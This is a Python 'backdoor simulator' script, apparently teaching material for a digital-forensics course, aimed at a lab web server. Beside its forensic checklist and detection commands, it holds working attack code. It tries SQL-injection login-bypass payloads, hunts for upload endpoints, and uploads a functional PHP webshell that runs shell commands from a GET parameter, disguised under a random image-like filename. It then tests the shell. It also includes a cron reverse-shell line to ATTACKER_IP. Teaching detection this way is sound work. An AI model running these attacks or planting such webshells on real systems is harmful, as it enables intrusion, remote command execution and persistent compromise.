#!/usr/bin/env python3
"""
Backdoor Installation Simulation
PT. TechMart Indonesia - Educational Purpose

DISCLAIMER: This script is for EDUCATIONAL PURPOSES ONLY!
Only use on systems you have permission to test.

Materi: CPMK-6 - Forensik Digital & Manajemen Risiko
Demonstrasi: Persistence mechanism dan jejak forensik
"""

import requests
import sys
import json
import os
import base64
from datetime import datetime
from urllib.parse import urljoin

# ANSI Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║{Colors.YELLOW}  🚪 BACKDOOR SIMULATOR - Forensik Digital                    {Colors.RED}║
║{Colors.CYAN}     PT. TechMart Indonesia - Educational Purpose Only        {Colors.RED}║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)

# Sample PHP Webshell (for educational demonstration)
SIMPLE_WEBSHELL = """<?php
/*
 * Educational Webshell - FOR LEARNING ONLY
 * This demonstrates what attackers might upload
 * Forensic indicators: Look for this file in web directories
 */

// Log all access for forensic analysis
error_log("[WEBSHELL ACCESS] " . date('Y-m-d H:i:s') . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | CMD: " . ($_GET['cmd'] ?? 'none'));

if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}

if(isset($_GET['info'])) {
    phpinfo();
}

// Hidden file listing
if(isset($_GET['ls'])) {
    echo "<pre>";
    $dir = $_GET['ls'] ?? '.';
    foreach(scandir($dir) as $file) {
        echo "$file\\n";
    }
    echo "</pre>";
}
?>
<!-- 
Forensic Indicators:
- File creation time will be after deployment
- Web server logs will show access to this file
- PHP will log command execution
- Unusual GET parameters: cmd, info, ls
-->
"""

PERSISTENCE_CRON = """
# Backdoor persistence - creates reverse shell every hour
# Forensic indicator: Check /etc/crontab and user crontabs
0 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
"""

class BackdoorSimulator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.activity_log = []
        self.deployed_backdoors = []
        
    def log(self, message, level="info"):
        colors = {
            "info": Colors.CYAN,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED,
            "backdoor": Colors.PURPLE
        }
        color = colors.get(level, Colors.RESET)
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.BOLD}[{timestamp}]{Colors.RESET} {color}{message}{Colors.RESET}")
        
        self.activity_log.append({
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message
        })
    
    def authenticate(self):
        """Authenticate using SQL Injection"""
        self.log("[*] Authenticating via SQL Injection...", "info")
        
        login_url = urljoin(self.target_url, "login.php")
        
        # SQL injection payloads
        sqli_payloads = [
            {"username": "admin'-- ", "password": "x"},
            {"username": "' OR '1'='1'-- ", "password": "x"},
            {"username": "admin' #", "password": "x"},
        ]
        
        for payload in sqli_payloads:
            try:
                self.log(f"    Trying: {payload['username']}", "info")
                response = self.session.post(login_url, data=payload, allow_redirects=True, timeout=10)
                if "dashboard" in response.text.lower() or "logout" in response.text.lower():
                    self.log(f"[✓] Authentication successful with: {payload['username']}", "success")
                    return True
            except Exception as e:
                continue
        
        self.log("[-] All SQL injection payloads failed", "warning")
        return False
    
    def find_upload_vulnerability(self):
        """Look for file upload functionality"""
        self.log("\n[PHASE 1] Searching for file upload vulnerabilities...", "backdoor")
        
        upload_paths = [
            "upload.php", "upload.php?bypass=1", "admin/upload.php", "file_upload.php",
            "image_upload.php", "media/upload.php"
        ]
        
        for path in upload_paths:
            url = urljoin(self.target_url, path)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and ('upload' in response.text.lower() or 'file' in response.text.lower()):
                    self.log(f"[+] Upload point found: {path}", "success")
                    return path
            except:
                pass
        
        self.log("[-] No upload functionality found", "warning")
        return None
    
    def deploy_webshell(self, upload_path="upload.php?bypass=1"):
        """Actually deploy webshell via file upload vulnerability"""
        self.log("\n[PHASE 2] Deploying webshell via file upload...", "backdoor")
        
        upload_url = urljoin(self.target_url, upload_path)
        
        # Generate random filename to avoid detection
        import random
        import string
        random_name = ''.join(random.choices(string.ascii_lowercase, k=6))
        webshell_filename = f"img_{random_name}.php"
        
        # Webshell content
        webshell_code = SIMPLE_WEBSHELL.encode('utf-8')
        
        try:
            # Upload via multipart form
            files = {'file': (webshell_filename, webshell_code, 'application/octet-stream')}
            
            self.log(f"[*] Uploading webshell as: {webshell_filename}", "info")
            response = self.session.post(upload_url, files=files, timeout=10)
            
            if response.status_code == 200:
                if 'success' in response.text.lower() or webshell_filename in response.text:
                    webshell_url = urljoin(self.target_url, f"uploads/{webshell_filename}")
                    self.log(f"[✓] Webshell uploaded successfully!", "success")
                    self.log(f"    Access URL: {webshell_url}", "success")
                    
                    # Test webshell
                    self.log(f"[*] Testing webshell...", "info")
                    test_response = self.session.get(f"{webshell_url}?cmd=id", timeout=5)
                    if test_response.status_code == 200:
                        self.log(f"[✓] Webshell is functional!", "success")
                        if 'uid=' in test_response.text:
                            self.log(f"    Command output detected", "success")
                    
                    self.deployed_backdoors.append({
                        "type": "webshell",
                        "filename": webshell_filename,
                        "url": webshell_url,
                        "timestamp": datetime.now().isoformat(),
                        "forensic_indicators": [
                            "File creation timestamp",
                            "Web access logs showing access to this file",
                            "Unusual GET parameters (cmd, exec, shell)",
                            "PHP function calls: shell_exec, system, passthru"
                        ]
                    })
                    return webshell_url
                else:
                    self.log(f"[-] Upload may have failed", "warning")
            else:
                self.log(f"[-] Upload failed (Status: {response.status_code})", "error")
                
        except Exception as e:
            self.log(f"[!] Upload error: {e}", "error")
        
        return None
    
    def simulate_webshell_deployment(self):
        """Simulate webshell deployment (fallback if real upload fails)"""
        self.log("\n[PHASE 2b] Simulating additional webshell deployments...", "backdoor")
        
        # This is a SIMULATION - in reality, the webshell would be uploaded
        # For educational purposes, we just document what would happen
        
        webshell_locations = [
            ".hidden/shell.php",
            "images/thumb.php",
            "css/style.php",
            "includes/config.php.bak"
        ]
        
        for location in webshell_locations:
            self.log(f"[*] Simulated deployment: {location}", "backdoor")
            self.deployed_backdoors.append({
                "type": "webshell",
                "location": location,
                "timestamp": datetime.now().isoformat(),
                "content_hash": "SHA256_OF_WEBSHELL_CONTENT",
                "forensic_indicators": [
                    "File creation timestamp",
                    "Web access logs showing access to this file",
                    "Unusual GET parameters (cmd, exec, shell)",
                    "PHP function calls: shell_exec, system, passthru"
                ]
            })
        
        self.log(f"[✓] Simulated {len(webshell_locations)} backdoor deployments", "success")
        return True
    
    def simulate_persistence_mechanisms(self):
        """Simulate various persistence mechanisms"""
        self.log("\n[PHASE 3] Simulating persistence mechanisms...", "backdoor")
        
        persistence_methods = [
            {
                "name": "Cron Job",
                "description": "Scheduled task for reverse shell",
                "location": "/etc/crontab or user crontab",
                "forensic_check": "Check crontab -l, /etc/cron.d/, /var/spool/cron/",
                "indicator": "Suspicious network connections on schedule"
            },
            {
                "name": "SSH Key",
                "description": "Add attacker's public key to authorized_keys",
                "location": "~/.ssh/authorized_keys",
                "forensic_check": "Review all authorized_keys files",
                "indicator": "Unknown SSH keys, SSH logins from unusual IPs"
            },
            {
                "name": "User Account",
                "description": "Create hidden admin account",
                "location": "/etc/passwd, /etc/shadow",
                "forensic_check": "Compare against known-good baseline",
                "indicator": "New user accounts, UID 0 accounts"
            },
            {
                "name": "Web Application Backdoor",
                "description": "Modify existing PHP files to include backdoor",
                "location": "Web application files",
                "forensic_check": "Hash comparison with original files",
                "indicator": "Modified file timestamps, changed file hashes"
            },
            {
                "name": "Database Trigger",
                "description": "SQL trigger that executes malicious code",
                "location": "MySQL database triggers",
                "forensic_check": "SHOW TRIGGERS; Review trigger code",
                "indicator": "Unexpected triggers, triggers calling system commands"
            }
        ]
        
        for method in persistence_methods:
            self.log(f"\n[+] {method['name']}", "backdoor")
            self.log(f"    Description: {method['description']}", "info")
            self.log(f"    Location: {method['location']}", "info")
            self.log(f"    Forensic Check: {method['forensic_check']}", "warning")
            
            self.deployed_backdoors.append({
                "type": "persistence",
                "method": method['name'],
                "details": method
            })
        
        return True
    
    def generate_forensic_guide(self):
        """Generate guide for forensic investigators"""
        self.log("\n[PHASE 4] Generating forensic investigation guide...", "backdoor")
        
        guide = {
            "title": "Backdoor Detection & Forensic Analysis Guide",
            "timestamp": datetime.now().isoformat(),
            "attack_simulation_summary": {
                "backdoors_deployed": len(self.deployed_backdoors),
                "types": list(set(b['type'] for b in self.deployed_backdoors))
            },
            "forensic_checklist": {
                "file_system_analysis": [
                    "Check for recently created/modified PHP files in web directories",
                    "Look for hidden directories (.hidden, .backup, etc.)",
                    "Search for files with suspicious names (shell, cmd, backdoor)",
                    "Compare file hashes against known-good baseline",
                    "Review file permissions (world-writable files)",
                    "Check for files with mismatched extensions (image.php.jpg)"
                ],
                "log_analysis": [
                    "Review web server access logs for unusual patterns",
                    "Look for access to non-standard PHP files",
                    "Search for suspicious GET/POST parameters",
                    "Check for encoded payloads (base64)",
                    "Analyze error logs for shell execution errors",
                    "Review authentication logs for anomalies"
                ],
                "user_analysis": [
                    "List all user accounts and compare to baseline",
                    "Check for UID 0 accounts besides root",
                    "Review SSH authorized_keys for all users",
                    "Check for recent sudo usage",
                    "Review .bash_history for all users"
                ],
                "process_analysis": [
                    "Check for suspicious running processes",
                    "Look for processes with unusual parent PIDs",
                    "Check for processes making network connections",
                    "Review memory for loaded malicious modules"
                ],
                "network_analysis": [
                    "Check for established connections to unknown IPs",
                    "Review listening ports for unauthorized services",
                    "Analyze network traffic for C2 communication",
                    "Check for DNS queries to suspicious domains"
                ],
                "persistence_check": [
                    "Review all cron jobs (system and user)",
                    "Check systemd services and timers",
                    "Review init scripts and rc.local",
                    "Check for modified system binaries",
                    "Review database triggers and stored procedures"
                ]
            },
            "detection_commands": {
                "find_webshells": [
                    "find /var/www -name '*.php' -mtime -7",
                    "grep -r 'shell_exec\\|system\\|passthru\\|eval' /var/www/",
                    "find /var/www -name '*.php' -exec grep -l 'base64_decode' {} \\;"
                ],
                "check_users": [
                    "cat /etc/passwd | awk -F: '$3 == 0 {print}'",
                    "find / -name authorized_keys 2>/dev/null",
                    "lastlog | grep -v 'Never logged in'"
                ],
                "check_cron": [
                    "crontab -l",
                    "ls -la /etc/cron.d/",
                    "cat /etc/crontab"
                ],
                "check_network": [
                    "netstat -tulpn",
                    "ss -tulpn",
                    "lsof -i -P -n"
                ]
            },
            "deployed_backdoors": self.deployed_backdoors
        }
        
        # Save guide
        guide_file = f"forensic_backdoor_guide_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(guide_file, 'w') as f:
            json.dump(guide, f, indent=2)
        
        self.log(f"[✓] Forensic guide saved: {guide_file}", "success")
        
        return guide
    
    def run_simulation(self):
        """Run complete backdoor simulation"""
        print(f"\n{Colors.BOLD}Starting Backdoor Simulation...{Colors.RESET}\n")
        
        # Authenticate
        auth_success = self.authenticate()
        
        # Find upload points
        upload_path = self.find_upload_vulnerability()
        
        # Deploy real webshell if upload found
        webshell_url = None
        if upload_path:
            webshell_url = self.deploy_webshell(upload_path)
        
        # Simulate additional deployments
        self.simulate_webshell_deployment()
        self.simulate_persistence_mechanisms()
        
        # Generate forensic guide
        guide = self.generate_forensic_guide()
        
        # Print summary
        print(f"""
{Colors.BOLD}═══════════════════════════════════════════════════════════════
                 BACKDOOR SIMULATION SUMMARY
═══════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.RED}⚠️  BACKDOOR DEPLOYMENT COMPLETE{Colors.RESET}

{Colors.CYAN}Authentication:{Colors.RESET} {"✓ Success" if auth_success else "✗ Failed"}
{Colors.CYAN}Real Webshell:{Colors.RESET} {webshell_url if webshell_url else "Not deployed"}

{Colors.CYAN}Deployed Backdoors:{Colors.RESET}
""")
        
        for bd in self.deployed_backdoors:
            if bd['type'] == 'webshell':
                print(f"  🚪 Webshell: {bd['location']}")
            elif bd['type'] == 'persistence':
                print(f"  🔄 Persistence: {bd['method']}")
        
        print(f"""
{Colors.YELLOW}Forensic Investigation Points:{Colors.RESET}
  1. Check web directories for unauthorized PHP files
  2. Review cron jobs and scheduled tasks
  3. Analyze SSH authorized_keys files
  4. Check for new user accounts
  5. Review network connections
  6. Compare file hashes with baseline

{Colors.GREEN}Detection Commands:{Colors.RESET}
  • find /var/www -name '*.php' -mtime -7
  • grep -r 'shell_exec' /var/www/
  • crontab -l
  • netstat -tulpn

{Colors.BOLD}═══════════════════════════════════════════════════════════════{Colors.RESET}
        """)
        
        return guide


def main():
    banner()
    
    import argparse
    parser = argparse.ArgumentParser(description='Backdoor Simulator for Forensic Simulation')
    parser.add_argument('--target', '-t', type=str, default='http://172.28.0.10', 
                        help='Target URL (default: http://172.28.0.10)')
    parser.add_argument('target_positional', nargs='?', default=None,
                        help='Target URL (positional argument)')
    
    args = parser.parse_args()
    
    # Use positional argument if provided, otherwise use --target
    target = args.target_positional if args.target_positional else args.target
    
    # Ensure URL has scheme
    if not target.startswith("http"):
        target = f"http://{target}"
    
    print(f"{Colors.BOLD}Target: {target}{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  This is for EDUCATIONAL PURPOSES ONLY!{Colors.RESET}\n")
    
    simulator = BackdoorSimulator(target)
    guide = simulator.run_simulation()
    
    print(f"""
{Colors.CYAN}This simulation demonstrates:{Colors.RESET}
1. How attackers establish persistence
2. Common backdoor techniques
3. Forensic indicators to look for
4. Detection and analysis methods

{Colors.YELLOW}Use this knowledge for DEFENSE, not offense!{Colors.RESET}
    """)


if __name__ == "__main__":
    main()
